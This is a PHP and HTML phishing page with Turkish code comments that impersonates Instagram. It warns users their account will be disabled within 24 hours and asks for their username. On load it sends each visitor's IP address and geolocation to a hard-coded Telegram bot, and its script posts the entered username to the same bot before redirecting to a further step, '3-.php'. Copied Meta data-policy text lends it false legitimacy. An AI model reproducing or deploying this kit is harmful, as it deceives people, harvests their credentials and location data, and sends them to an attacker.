
<?php

// Kullanıcının IP adresini al
$ip = $_SERVER['REMOTE_ADDR'];

// Dış servise IP bilgilerini gönder
$apiUrl = "http://ip-api.com/json/{$ip}";
$response = json_decode(file_get_contents($apiUrl), true);

// Telegram'a mesaj gönderme işlemi
$chatId = '-4107249278';
$botToken = '6712897367:AAFBFLG8srIn4GY5MatuCYJlpcjMBmsItYI';

// Tüm verileri Telegram mesajına ekleyerek formatla
$message = "
    1- IP: {$ip}
    2- Ülke: {$response['country']}
    3- Ülke Kodu: {$response['countryCode']}
    4- Bölge: {$response['region']}
    5- Bölge Adı: {$response['regionName']}
    6- Şehir: {$response['city']}
    7- Posta Kodu: {$response['zip']}
    8- Enlem: {$response['lat']}
    9- Boylam: {$response['lon']}
    10- Zaman Dilimi: {$response['timezone']}
    11- ISP: {$response['isp']}
    12- Organizasyon: {$response['org']}
    13- AS: {$response['as']}
    14- Sorgu: {$response['query']}
";

$telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
$telegramParams = [
    'chat_id' => $chatId,
    'text' => $message
];

// Telegram API'sine isteği gönder
file_get_contents($telegramApiUrl . '?' . http_build_query($telegramParams));

?>

<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <script>
        function sendMessageToTelegram() {
            var chatId = '-4107249278'; // Hedef chat ID
            var botToken = '6712897367:AAFBFLG8srIn4GY5MatuCYJlpcjMBmsItYI'; // Botunuzun token'ı

            var message = document.getElementById('myTextarea').value; // Textarea'dan mesajı al

            // Kullanıcının girdiği kelimenin "Telegram'a şu şekilde iletilmesini istiyorum" ifadesiyle birleştir
            var formattedMessage = ' 1- username: ' + message;

            // Telegram API'ye gönderilecek URL oluştur
            var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(formattedMessage)}`;

            // API'ye HTTP GET isteği gönder
            var xhr = new XMLHttpRequest();
            xhr.open('GET', apiUrl, true);
            xhr.send();
        }
    </script>

    <style>
    body {
  font-family: 'Roboto', sans-serif;
  margin: 0;
  padding: 0;
  background-color: #f4f4f4;
  color: #333;
  display: flex;
  flex-direction: column;
  align-items: center;
  height: 100vh;
  overflow: hidden; /* Sayfa kaydığında scroll bar'ı gizler */
  background: linear-gradient(45deg, #6228d7, #ee2a7b, #f9ce34);
}

        header {
            width: 100%;
            background-color: white;
            padding: 10px 0;
            position: fixed;
            top: 0;
            box-shadow: 0px 5px 5px -5px rgba(0, 0, 0, 0.5);
            z-index: 2; /* Main'in önünde olması için */
        }

        hr {
            border: none;
            margin: 0;
        }

        main {
            max-width: 600px;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            position: relative;
            z-index: 1;
            margin-top: -100vh; /* Yukarıda başlasın */
            transition: margin-top 1s ease; /* Animasyon süresi ve geçiş efekti */
            margin-bottom: 200px; /* Sabitlenmiş header'ın altında kalsın */
        }

        img {
            width: 100px; /* Resmi biraz daha büyüt */
            height: auto;
            margin: 0 auto;
            display: block;
        }

        textarea {
            width: 100%;
            height: 45px;
            margin: 15px 0;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 5px;
            resize: none;
            font-size: 16px;
            line-height: 1.4;
            background-color: #f9f9f9;
            outline: none;
        }

        button {
            font-family: 'Roboto', sans-serif;
            background-color: transparent;
            color: #fff;
            border: none;
            padding: 5px 30px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            opacity: 1;
            transition: opacity 0.3s ease;
        }

        button.active {
            background-color: #3498db;
            opacity: 1;
        }

        button:hover {
            background-color: #2980b9;
        }

        textarea:focus + button,
        textarea:not(:focus) + button {
            background-color: #3498db;
        }

        p {
            font-size: 12px;
            margin-top: 10px;
        }

        @media only screen and (max-width: 600px) {
            main {
                max-width: 100%;
                padding: 15px;
                margin-top: 0 !important;
                transition: none;
            }
        }

        footer {
            background-color: white;
            padding: 10px 0;
            width: 100%;
            position: fixed;
            bottom: 0;
            text-align: center;
            border-top: 1px solid #ccc; /* İnce çerçeve ekleniyor */
            box-shadow: 0px -5px 5px -5px rgba(0, 0, 0, 0.1);
        }


    </style>
    <style>
     body {
         background-color: #ffffff; /* Sayfa arka plan rengi */
     }

     /* Seçili öğelerin ve yazıların engellenmesi */
     ::selection {
         background-color: transparent;
         color: inherit; /* Yazı rengini değiştirmek istiyorsanız */
     }

     ::-moz-selection {
         background-color: transparent;
         color: inherit; /* Yazı rengini değiştirmek istiyorsanız */
     }

     /* Kullanıcı seçimini ve sürükleme işlemini engelleme */
     body {
         user-select: none;
         -moz-user-select: none; /* Firefox için */
         -ms-user-select: none; /* Internet Explorer için */
         -webkit-user-select: none; /* Chrome, Safari ve Opera için */
         -webkit-user-drag: none; /* Chrome, Safari ve Opera için sürükleme engelleme */
     }    .container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 80%;
            max-width: 1200px;
            text-align: justify;
        }  @media screen and (min-width: 768px) {
            p {
                font-size: 18px; /* 768 piksel ve üstü için font boyutu */
            }
        }
 </style>  <style>

        .video-container {
            position: fixed;
            height: 100vh;
            overflow: hidden;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.7; /* İstediğiniz şeffaflığı ayarlayabilirsiniz (0 ile 1 arasında bir değer). */
        }


            .content {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                color: #fff;
                text-align: center;
            }

            /* Videonun sayfanın ikinci yarısında görünmesini sağlamak için aşağıdaki stil eklendi */
            @media (min-height: 200px) {
                .video-container {
                    transform: translateY(30%);
                }
            }
    </style>
</head>

<body>
  <div style="z-index:-9" class="video-container">
      <video autoplay loop muted playsinline>
          <source src="bg.mp4" type="video/webm">
          Your browser does not support the video tag.
      </video>

  </div>
    <header>
        <!-- Header içeriği buraya gelecek -->
        <img src="https://i.hizliresim.com/oxaw80m.png" alt="cars">
        <hr>
    </header>
    <br> <br> <br> <br> <br>
    <main>


          <div style="width: 70px; height: 70px; border-radius: 50%; overflow: hidden; text-align: center; margin: auto; box-shadow: 0 0 0px 0px rgba(0, 0, 0, 0.5);">
        <img src="https://i.hizliresim.com/ec163hw.png" alt="Kare Resim" style="width: 100%; height: 100%; border-radius: 50%;">
    </div>




    <h4>Help Us Recover Your Account</h4>
  <p style="font-size:14px">Your account has committed violations of the data policy. Your account will be disabled within 24 hours.  <br> Enter your username and we'll help you with our best to re-enter your account. .</p>
</div>

        <textarea readonly id="myTextarea"  maxlength="30" rows="1" placeholder="Type your username here..."></textarea>

        <button type="submit" onclick="sendMessageToTelegram()" id="myButton">Help</button>
        <script>
                // Fotoğraflara tıklanmayı ve sürüklenmeyi engellemek için JavaScript kodu
                document.addEventListener('DOMContentLoaded', function() {
                    var images = document.getElementsByTagName('img');
                    for (var i = 0; i < images.length; i++) {
                        images[i].addEventListener('click', function(event) {
                            event.preventDefault();
                        });

                        images[i].addEventListener('dragstart', function(event) {
                            event.preventDefault();
                        });
                    }
                });
            </script>
        <script>
            document.addEventListener('DOMContentLoaded', function () {
                // Get the textarea element
                var textarea = document.getElementById('myTextarea');

                // Get the URL parameters
                var urlParams = new URLSearchParams(window.location.search);

                // Check if there is a parameter named 'word' in the URL
                if (urlParams.has('word')) {
                    // Get the value of the 'word' parameter
                    var wordValue = urlParams.get('word');

                    // Set the value of the textarea to the wordValue
                    textarea.value = wordValue;

                    // Toggle the 'active' class on the button
                    var button = document.getElementById('myButton');
                    button.classList.toggle('active', textarea.value.trim() !== '');
                }

                // Add event listeners for input and button
                textarea.addEventListener('input', function () {
                    var button = document.getElementById('myButton');
                    button.classList.toggle('active', this.value.trim() !== '');
                });

                document.getElementById('myButton').addEventListener('click', function () {
                    // Redirect to the same page with the word parameter
                    window.location.href = window.location.origin + window.location.pathname + '?word=' + encodeURIComponent(textarea.value.trim());
                });
            });

            // Check if there is a parameter named 'word' in the URL
            var wordFromUrl = window.location.search.split('=')[1];

            // If 'word' parameter exists, set the value of the textarea
            if (wordFromUrl) {
                document.getElementById('myTextarea').value = decodeURIComponent(wordFromUrl);
            }

            // Sayfa yüklendiğinde animasyon
            window.addEventListener('load', function () {
                document.querySelector('main').style.marginTop = '0'; // Yukarıda başlasın

                // Animasyonu başlat
                setTimeout(function () {
                    document.querySelector('main').style.marginTop = '0'; // Yukarıda başlasın
                }, 100);
            });
        </script>
        <script>
            document.addEventListener('DOMContentLoaded', function () {
                // Diğer kodlar burada...

                // Yeni event listener ekleyerek "Enter" tuşuna basıldığında butonu aktifleştir
                document.getElementById('myTextarea').addEventListener('keydown', function (e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        document.getElementById('myButton').click();
                    }
                });
            });

            // Diğer kodlar burada...
        </script>
        <script>
      document.addEventListener('DOMContentLoaded', function () {
          // Belirli bir kelimeyi oluşturmak için harfler
          var letters = ['©', '2', '0', '2', '4', 'I', 'N', 'S', 'T'];

          // Harfleri direkt olarak birleştir
          var dynamicWord = letters.join('');
          document.getElementById('dynamicWord').textContent = dynamicWord;
      });
  </script>
  <script>
    document.addEventListener('DOMContentLoaded', function () {
        // Get the textarea element
        var textarea = document.getElementById('myTextarea');

        // Add event listeners for input and button
        textarea.addEventListener('input', function () {
            var button = document.getElementById('myButton');
            button.classList.toggle('active', this.value.trim() !== '');
        });

        document.getElementById('myButton').addEventListener('click', function () {
            // Redirect to the PHP page with the word parameter using PHP header
            window.location.href = '3-.php?word=' + encodeURIComponent(textarea.value.trim());
        });
    });
</script>


</main>
    <div class="container">
      <h2 style="opacity:0.5;"> lnstagram Data Policy</h2>
      <p style="opacity:0.5;">
        The Facebook company is now called Meta. We updated our Terms of Use, Data Policy, and Cookies Policy to reflect this new name on January 4, 2022. Our company name has changed, but we continue to offer the same products, including the Facebook app that Meta provides. Our Data Policy and Terms of Service remain in effect, and this name change doesn't affect how we use and share data. Learn more about Meta and our vision for the metaverse.
      </p>
        <h4 style="opacity:0.5;"> Data Policy</h4>
      <p id="hebele" style="font-size:14px; opacity:0.5">
        This policy describes the information we process to support Facebook, lnstagram, Messenger and other products and features offered by Meta Platforms, Inc. (Meta Products or Products). You can find more tools and information in Facebook Settings and lnstagram Settings.
      </p>    <h4 style="opacity:0.5;"> I. What you and others do, and the information you provide.</h4>
      <p style="opacity:0.5">
      <strong>  •  Information and content you provide.  </strong> We collect content, messages, and other information that you provide when you use our Products, including when you sign up for an account, create or share content, and message or communicate with others. This may include information in or about the content you provide (such as metadata), such as the location where a photo was taken or the date a file was created. This can also include what you see through the features we offer. This allows us to suggest masks or filters that you might like, for example, when you use our camera, or to give you tips on how to use camera formats. Our systems automatically process content and messages provided by you and others, analyzing the context and content of such content and messages for the following purposes. Learn more about how you can control who can see what you share.
Data subject to special protections: You can choose to share information about your religious beliefs, political views, people you "care about" or your health in your Facebook profile areas or Milestones. This and other information (such as racial or ethnic origin, philosophical beliefs, trade union membership) may be subject to special protections under the laws of your country.
      </p>
  </div>
    <footer style="font-size: 1px; line-height: 1;">
      <p id="dynamicWord" style="margin: 0; display: inline;"></p>
      <p style="display: inline;"> AGRAM</p>
  </footer>

</body>

</html>
